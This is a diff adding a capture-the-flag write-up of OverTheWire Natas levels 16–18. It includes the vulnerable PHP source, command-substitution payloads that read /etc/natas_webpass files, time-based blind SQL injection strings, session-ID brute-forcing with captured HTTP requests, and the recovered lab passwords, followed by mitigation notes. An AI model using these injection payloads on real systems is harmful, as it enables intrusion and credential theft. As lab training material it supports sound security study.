@@ -2011,13 +2011,131 @@ URL: http://natas16.natas.labs.overthewire.org
 Username: natas16
 Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed a message For security reasons, we now filter even more on certain characters, along with an input field labeled “Find words containing:” and a Search button.
 
-### Approach 
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas16</h1>
+<div id="content">
+
+For security reasons, we now filter even more on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+From the source code, user input is passed into a system command: `passthru("grep -i \"$key\" dictionary.txt");`. Although certain characters are filtered using: `preg_match('/[;|&`\'"]/',$key)`, the application still allows command substitution using: `$(...)`. This introduces a Command Injection vulnerability, specifically via command substitution.
+
+#### Initial Testing: 
+Input: aa
+Output: 
+```
+aardvark
+aardvark's
+bazaar
+bazaar's
+bazaars
+```
+This confirms that the input is directly used in the grep command.
+
+
+### Approach 
+To exploit the vulnerability, command substitution using $() is used. The key idea is to inject a command that checks the password file:
+```
+grep ^a /etc/natas_webpass/natas17
+```
+If the password starts with a → output exists
+If not → no output
+
+#### Payload Example:
+```
+$(grep ^a /etc/natas_webpass/natas17)aa
+```
+
+#### Resulting command:
+```
+grep -i "$(grep ^a /etc/natas_webpass/natas17)aa" dictionary.txt
+```
+
+#### Behavior
+- If the condition is TRUE (correct character):
+  → grep receives a valid pattern → dictionary results are returned
+- If the condition is FALSE:
+  → empty substitution → no meaningful output
+This creates a Boolean-based command injection channel.
+
+#### Password Extraction
+The password is extracted character by character using prefix matching through Burpsuite.
+
+##### Step-by-step process:
+```
+$(grep ^a /etc/natas_webpass/natas17)aa
+$(grep ^E /etc/natas_webpass/natas17)aa
+$(grep ^Eq /etc/natas_webpass/natas17)aa
+$(grep ^Eqj /etc/natas_webpass/natas17)aa
+```
+Each step confirms whether the prefix is correct.
+
+#### Result
+By iterating through all characters, the password for the next level is obtained (EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC).
+
 
 ### Analysis
+This level demonstrates a Command Injection vulnerability despite input filtering.
+
+Key issues:
+- User input is directly passed into a system command
+- Incomplete filtering (missed $() command substitution)
+- Reliance on blacklist filtering instead of secure handling
+
+Security implications:
+- Arbitrary command execution
+- Access to sensitive system files
+- Full compromise of the application environment
+
+Recommended mitigations:
+- Avoid using system commands with user input
+- Use safe APIs instead of passthru()
+- Apply strict input validation (allowlist)
+- Escape user input properly (e.g., escapeshellarg)
+
 
 ---
 
@@ -2026,15 +2144,140 @@ After login, the following note is displayed:
 ```
 URL: http://natas17.natas.labs.overthewire.org
 Username: natas17
-Password: 
+Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed an input field requesting a username, along with a Check existence button.
 
-### Approach 
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas17</h1>
+<div id="content">
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+From the source code:
+```
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+```
+User input is directly embedded into the SQL query without sanitization, indicating a SQL Injection vulnerability.
+
+However, unlike the previous level:
+- No output is displayed regardless of the query result
+- No TRUE/FALSE response is visible
+This confirms a Time-based Blind SQL Injection vulnerability.
+
+
+### Approach 
+#### Step 1: Confirm Time-Based Injection
+Payload: `natas18" AND SLEEP(5)#`
+
+Observation:
+- If the condition is valid → response delayed (~5 seconds)
+- If invalid → immediate response
+This confirms that execution time can be used as a side-channel.
+
+#### Step 2: Determine Password Length
+Payload pattern:
+```
+natas18" AND (SELECT LENGTH(password)=32 FROM users WHERE username="natas18") AND SLEEP(5)#
+```
+
+Using Burp Suite:
+- Iterate values from 1 → 40
+- Monitor response time
+
+Result: `Password length = 32`
+
+#### Step 3: Extract Password (Prefix Matching)
+Use prefix-based extraction with `LIKE`:
+```
+natas18" AND (SELECT BINARY password LIKE "a%" FROM users WHERE username="natas18") AND SLEEP(5)#
+```
+If response is delayed → prefix is correct
+
+#### Iterative Extraction
+Build the password character by character:
+- `natas18" AND (SELECT BINARY password LIKE "6%" FROM users WHERE username="natas18") AND SLEEP(5)#`
+- `natas18" AND (SELECT BINARY password LIKE "6O%" FROM users WHERE username="natas18") AND SLEEP(5)#`
+- `natas18" AND (SELECT BINARY password LIKE "6OG%" FROM users WHERE username="natas18") AND SLEEP(5)#`
+
+Repeat until all 32 characters are obtained.
+
+#### Result
+The extracted password is: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
+
 
 ### Analysis
+This level demonstrates a Time-based Blind SQL Injection vulnerability.
+
+Key characteristics:
+- No visible output from the application
+- Exploitation relies on measuring response time
+- Uses database functions like SLEEP() as a side channel
+
+Security issues:
+- Unsanitized SQL query construction
+- Lack of prepared statements
+- No protection against timing-based attacks
+
+Recommended mitigations:
+- Use parameterized queries (prepared statements)
+- Implement query time limits
+- Avoid exposing database behavior through timing differences
+
 
 ---
 
@@ -2043,13 +2286,185 @@ After login, the following note is displayed:
 ```
 URL: http://natas18.natas.labs.overthewire.org
 Username: natas18
-Password: 
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed username and password input field and login button. 
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+<?php
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+}
+
+if($showform) {
+?>
+
+<p>
+Please login with your admin account to retrieve credentials for natas19.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+### Finding 
+find the admin php session 
+firstly, because of the phpsession has not been set as cookie, so just input anything and login. then refresh again, you will auto logged in as regular user (for my case). then, use the burpsuite to capture the request. then, can identified that the phpsession already been assigned... 
+request header content: 
+GET / HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=459
+Upgrade-Insecure-Requests: 1
+
+PHPSESSID=459
+then, because dont know what is the exact phpsessionid assigned for the admin, thus need to brute force the phpsession. 
+
 
 ### Approach 
 
-### Finding 
+
+below is the content that have successfully captured. 
+request content
+GET / HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=119
+Upgrade-Insecure-Requests: 1
+
+response content
+HTTP/1.1 200 OK
+Date: Fri, 17 Apr 2026 15:37:57 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1024
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+
+
 
 ### Analysis
 
@@ -2060,9 +2475,12 @@ After login, the following note is displayed:
 ```
 URL: http://natas19.natas.labs.overthewire.org
 Username: natas19
-Password: 
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
 
 ### Approach 
 
@@ -2079,7 +2497,10 @@ URL: http://natas20.natas.labs.overthewire.org
 Username: natas20
 Password: 
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
 
 ### Approach 
 
@@ -2096,7 +2517,10 @@ URL: http://natas21.natas.labs.overthewire.org
 Username: natas21
 Password: 
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
 
 ### Approach 
 
@@ -2113,7 +2537,10 @@ URL: http://natas22.natas.labs.overthewire.org
 Username: natas22
 Password: 
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed an input field requesting a username, along with a Check existence button.
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
 
 ### Approach 
 
